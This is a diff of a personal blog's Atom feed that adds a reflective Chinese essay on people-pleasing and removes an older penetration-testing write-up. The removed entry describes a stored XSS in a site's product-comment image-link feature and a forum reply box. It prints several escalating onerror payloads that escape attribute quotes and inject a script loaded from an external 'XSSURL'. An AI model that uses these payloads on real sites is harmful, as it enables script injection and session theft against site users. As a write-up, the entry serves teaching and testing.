@@ -6,7 +6,7 @@
   <link href="https://www.se7ensec.cn/atom.xml" rel="self"/>
   
   <link href="https://www.se7ensec.cn/"/>
-  <updated>2020-11-18T14:12:42.130Z</updated>
+  <updated>2020-11-26T14:59:20.963Z</updated>
   <id>https://www.se7ensec.cn/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>有一天你变成了别人眼中的自己</title>
+    <link href="https://www.se7ensec.cn/2020/11/26/%E6%9C%89%E4%B8%80%E5%A4%A9%E4%BD%A0%E5%8F%98%E6%88%90%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9C%BC%E4%B8%AD%E7%9A%84%E8%87%AA%E5%B7%B1/"/>
+    <id>https://www.se7ensec.cn/2020/11/26/%E6%9C%89%E4%B8%80%E5%A4%A9%E4%BD%A0%E5%8F%98%E6%88%90%E4%BA%86%E5%88%AB%E4%BA%BA%E7%9C%BC%E4%B8%AD%E7%9A%84%E8%87%AA%E5%B7%B1/</id>
+    <published>2020-11-26T02:16:18.000Z</published>
+    <updated>2020-11-26T14:59:20.963Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>你永远不知道自己有多好，一直想变成别人眼中更好的自己。</p></blockquote><a id="more"></a><p>小的时侯和父母去小卖部，总会出现这么一段对话：</p><p>​    父母：”有什么想买的好吃的嘛？“<br>​    我：”没有想买的。“<br>​    小卖部老板：”这孩子真懂事，哈哈哈，还知道省着钱。“</p><p>那时候的我其实对金钱还没有什么概念，只是慢慢的觉的这样做身边的人会很高兴，也许从那时起就学会了如何抑制自己的欲望。</p><p>这些年渐渐的发现，自己培养出了一种讨好型人格。大概就是，不希望让和自己相处的人感到失望，不希望别人对自己有偏见，哪怕去做一些并不是很喜欢去做的事情，开始变得越来越压抑，那些理解的、不理解的、羡慕的、鄙夷的、仰望的、嫌弃的，一道道来自他人的目光，成为了我喜怒哀乐的理由。</p><p>自己有时候也感到很迷茫，是自己在逼着自己变得更好嘛？还是为了变成父母、亲人、挚爱、朋友……满意的样子？</p><p>或许是每个人都是有两个自我，一个是外在呈现，一个是内在呈现，这两个自我相互矛盾。</p><p>举个挺常见的例子，比如你外在看起来开朗乐观，喜欢跟朋友聚会玩耍，可以很容易的和每个人交朋友，但是内在大多时候却有些孤独，希望有一点独处的时间……</p><p>现在再来想一想，如果剥离掉所有的附加价值，我会是谁？我所追求的一切，到底是自己真正想要的，还是为了满足别人的意愿驱使而追求的？没有任何外在标签的我，双脚是否还能踩在大地上，感受到自己的存在？</p><p>人啊，真是个奇怪的动物。</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=22821100&auto=1&height=66"></iframe>]]></content>
+    
+    
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;你永远不知道自己有多好，一直想变成别人眼中更好的自己。&lt;/p&gt;
+&lt;/blockquote&gt;</summary>
+    
+    
+    
+    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
+    
+    
+    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
+    
+  </entry>
   
   <entry>
     <title>一星期实战总结（四）</title>
@@ -444,29 +467,6 @@
     
     <summary type="html">&lt;blockquote&gt;
 &lt;p&gt;要保持学习的好习惯，这次平时学的就用上了。&lt;/p&gt;
-&lt;/blockquote&gt;</summary>
-    
-    
-    
-    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-    
-    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>一处图片引用功能导致的XSS</title>
-    <link href="https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/"/>
-    <id>https://www.se7ensec.cn/2019/12/04/%E4%B8%80%E5%A4%84%E5%9B%BE%E7%89%87%E5%BC%95%E7%94%A8%E5%8A%9F%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84XSS/</id>
-    <published>2019-12-04T15:10:24.000Z</published>
-    <updated>2020-11-14T19:58:50.676Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><p>未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。</p></blockquote><a id="more"></a><h1 id="山重水复疑无路"><a href="#山重水复疑无路" class="headerlink" title="山重水复疑无路"></a>山重水复疑无路</h1><p><font color=#FF0000 >漏洞点：站点产品评论处</font></p><h2 id="初步测试"><a href="#初步测试" class="headerlink" title="初步测试"></a>初步测试</h2><p>一开始尝试XSS，发现程序有过滤，提交均显示Tags are not permitted，最后测出来的是过滤 &lt; ，不过滤 &gt;</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/1.png" alt="1"></p><p>因为提示速度比较快，猜测前端有一层检测。尝试绕过前端检测，burp拦截正常提交的内容，替换xss payload后发送，发现会自动跳转回首页，由此发现程序后端也有内容检测，这里直接xss暂时行不通。</p><p>查看编辑器的其他功能：</p><p>图片上传：<br>可上传aspx（其他可能解析后缀均已尝试），不能解析并跳转至首页。<br>可上传html并解析，这种方式构造的xss通常需要主动攻击，且攻击时易被管理员察觉到异常，暂不考虑。</p><p>表情功能：没什么可利用的。</p><h1 id="柳暗花明又一村"><a href="#柳暗花明又一村" class="headerlink" title="柳暗花明又一村"></a>柳暗花明又一村</h1><p>当看到编辑器提示的 img 外部图片引用方式时引起了我的注意，这里感觉可以操作一下：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.png" alt="2"></p><h2 id="正常测试"><a href="#正常测试" class="headerlink" title="正常测试"></a>正常测试</h2><p>先来看下正常引用方式时前端的显示，链接被带入到src中（logo前文字涉及域名，打码）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|XSSURL|xxxxx Logo]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/3.png" alt="3"></p><h2 id="带入payload"><a href="#带入payload" class="headerlink" title="带入payload"></a>带入payload</h2><p>把xss payload 放在链接的位置再看一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">常规的payload：</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;</span><br><span class="line">构造的payload：</span><br><span class="line">[img|x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|xxxxx Logo]</span><br></pre></td></tr></table></figure><p>提交后审查元素发现为如下显示：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/4.png" alt="4"></p><h2 id="尝试闭合"><a href="#尝试闭合" class="headerlink" title="尝试闭合"></a>尝试闭合</h2><p>尝试闭合 x 处的双引号，让 onerror 逃逸出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;|hello] </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/5.png" alt="5"></p><p>这里提交后发现payload并没有执行成功，仔细看发现程序输出时分别在 onerror= 和 ; 后面加了双引号。</p><h2 id="闭合成功"><a href="#闭合成功" class="headerlink" title="闭合成功"></a>闭合成功</h2><p>直接给个 &gt; 让它闭合，虽然成功加载了，但是页面显示会有错误，这样十分容易被发现倪端，不够完美。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&gt;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/6.png" alt="6"></p><p>换个思路通过闭合掉 ; 后面的双引号，显示效果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[img|x&quot; onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;&quot;|hello]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/7.png" alt="7"></p><p>最终在没有任何错误内容显示的情况下成功执行了xss payload：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/8.png" alt="8"></p><p>看到这里可能有人就会想，这种案例触发的xss是不是很少存在，因为毕竟不是每个编辑器都用这种图片外链引用方式，那么请继续看下面。</p><h1 id="灵活运用"><a href="#灵活运用" class="headerlink" title="灵活运用"></a>灵活运用</h1><p>这几天在搞一个gangdu的论坛，在回复功能处，又遇到了同样的问题。</p><p>本来这个功能应该只能放图片链接的，但是这里插入的链接格式和内容并没有做校验。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.1.jpg" alt="2.1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x onerror&#x3D;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p>这里直接把payload放进去，看下前端显示</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.2.jpg" alt="2.2"></p><p>同样的思路，这里直接闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x&quot; onerror&#x3D;&quot;s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;XSSURL&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.3.jpg" alt="2.3"></p><p>成功加载payload</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2019.12.04/2.4.jpg" alt="2.4"></p><p>平时渗透的时候，看到功能点不要上去就是蛮干，先预想下这个功能是大概怎么实现的，然后思路猥琐一点，心细一点，往往会有意想不到的收获的，就写到这里吧。</p>]]></content>
-    
-    
-    <summary type="html">&lt;blockquote&gt;
-&lt;p&gt;未来迷人绚烂总在向我召唤，哪怕只有痛苦作伴也要勇往直前。&lt;/p&gt;
 &lt;/blockquote&gt;</summary>
     
     
